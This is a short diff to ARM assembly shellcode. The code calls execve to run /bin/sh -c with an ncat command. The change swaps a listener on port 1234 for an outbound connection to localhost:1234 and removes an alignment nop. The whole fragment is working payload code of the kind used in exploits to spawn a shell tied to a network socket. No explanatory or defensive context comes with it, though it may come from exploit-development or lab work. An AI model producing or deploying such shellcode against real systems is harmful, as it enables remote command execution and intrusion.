@@ -31,11 +31,10 @@ _start:
     eor    r2, r2, r2     // penv = NULL
     mov    r1, sp         // r1 = argv
     mov    r7, #11        // r7 = execve
-    svc    1
-    nop                   // align by 4 bytes   
+    svc    1  
 sh:    
 .ascii "/bin/shX"
 c_arg:
 .ascii "-cXX"
 cmd:
-.ascii "ncat -kl4 1234XX" // listen on port 1234
+.ascii "ncat -4 localhost 1234" // connect to localhost:1234
